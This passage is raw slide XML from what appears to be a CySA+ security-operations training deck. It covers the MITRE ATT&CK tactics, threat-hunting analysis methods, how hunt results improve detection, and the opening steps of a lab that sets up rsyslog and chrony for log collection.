              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You may be given a described attacker action and asked to match it to the correct ATT&amp;CK tactic, or asked how ATT&amp;CK supports detection engineering and threat hunting.</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257</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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PROFILING THREAT ACTORS AND ACTIVITIES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MITRE ATT&amp;CK framework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Initial access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Persistence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Privilege escalation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Defense evasion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Credential access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Discovery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Lateral movement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Collection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Command and control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Exfiltration</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258</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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PROFILING THREAT ACTORS AND ACTIVITIES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MITRE ATT&amp;CK framework (cont'd)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Impact</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259</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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PROFILING THREAT ACTORS AND ACTIVITIES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Threat Hunting Tactics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Threat hunting proactively searches for adversaries that have evaded existing automated detections, focusing on high-impact TTPs across the attack lifecycle such as initial access and discovery, persistence, lateral movement and privilege escalation, command and control, and exfiltration.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts apply structured data-analysis techniques to surface anomalies: searching (querying data for specific indicators), clustering (using algorithms to group similar events by shared characteristics), grouping (correlating a set of items known to appear together under defined criteria), and stacking or stack counting (tallying values to expose statistical outliers that stand apart from the norm).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Stacking is especially powerful for finding the rare, odd process or host among thousands of otherwise identical ones.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These tactics matter because they let a hunter reduce huge datasets to a manageable set of suspicious leads and confirm or rule out a hypothesis efficiently.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions that describe an analysis method (for example, counting occurrences to find outliers) and ask you to name it as stacking, clustering, grouping, or searching.</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260</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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PROFILING THREAT ACTORS AND ACTIVITIES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Threat Hunting Tactics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High-impact TTPs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Initial access and discovery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Persistence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Lateral movement and privilege escalation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Command and control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Exfiltration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Searching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Clustering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Grouping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stacking</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261</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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PROFILING THREAT ACTORS AND ACTIVITIES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Threat Hunting Tactics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Executable process analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Reverse engineering</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262</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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RESULTS AND BENEFITS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Delivering Results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Delivering results is the output phase of a threat hunt, where findings are turned into concrete defensive improvements and communicated to stakeholders.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Core deliverables include documenting the entire process so the hunt is repeatable and auditable, reducing the attack surface by closing exposed services and unnecessary access, bundling or grouping critical assets so they receive focused monitoring and protection, exploring newly discovered attack vectors to understand how an adversary could progress, and using integrated intelligence to enrich and validate what was found.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The goal is that every hunt, even one that finds no active compromise, leaves the environment measurably harder to attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because undocumented or uncommunicated findings deliver no value, whereas well-delivered results directly harden defenses and justify continued hunting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions on the outcomes of a threat hunt, such as which action reduces attack surface or why documenting the hunt process matters.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263</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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RESULTS AND BENEFITS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Delivering Results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Document the process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reduce the attack surface area</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Bundle critical assets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Explore attack vectors</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use integrated intelligence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264</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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RESULTS AND BENEFITS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Improving Detection Capabilities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A major payoff of threat hunting is feeding lessons learned back into the organization's detection stack so future attacks are caught automatically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Concrete improvements include updated firewall and IDS/IPS rules, refined alert logic in SIEM and EDR platforms, better sensor placement across the network, and improved asset visibility so no host is a blind spot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Benefits extend beyond the detection team to changes in the software development process and to security awareness training across the whole organization, addressing root causes rather than just symptoms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Framing these tangible outputs is also how an analyst convinces leadership and finance to keep funding the hunting program, by showing that each hunt produces reusable detections and reduced risk rather than a one-time cost.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking how threat-hunting output improves ongoing detection (updating SIEM/EDR/IDS logic, sensor placement) or how to justify hunting to non-technical stakeholders.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265</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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RESULTS AND BENEFITS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Improving Detection Capabilities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How do you convince stakeholders and financial department?</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266</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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RESULTS AND BENEFITS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Improving Detection Capabilities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Threat-hunting output benefits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Updated firewall and intrusion detection/prevention system (IDS/IPS) rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Updated alert logic for SIEM platforms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Updated alert logic for endpoint detection and response (EDR) platforms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Improvements to sensor placement across the network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Improvements to asset visibility</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267</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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RESULTS AND BENEFITS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Improving Detection Capabilities (3)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Other benefits to detection team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Changes in your organization’s development process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Changes to security training across the organization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Changes to quality assurance and quality control processes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268</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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TOPIC 1 · PRACTICE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Hands-On: Labs 1–10</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10 step-by-step labs applying Security Operations in the Killercoda playground and free tools.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269</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1 — Log Ingestion and Time Synchronization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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will configure a centralised syslog collector with rsyslog and synchronise the system clock with chrony. Accurate timestamps and reliable log ingestion are the foundation of every SOC: if logs from two hosts disagree on time by 30 seconds, you cannot correlate an attack across them. By the end you will…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  CySA+ mapping: 1.1 — Log ingestion, Time synchronization, Logging levels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270</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1 — Reference Diagram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g_48ab3be242.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="874658" y="1783080"/>
            <a:ext cx="10439636" cy="4434840"/>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271</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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1 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install rsyslog and chrony</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>rsyslog is the default Linux syslog daemon.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y rsyslog chrony</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Verify time synchronization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The Stratum field tells you how many hops to a reference clock.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
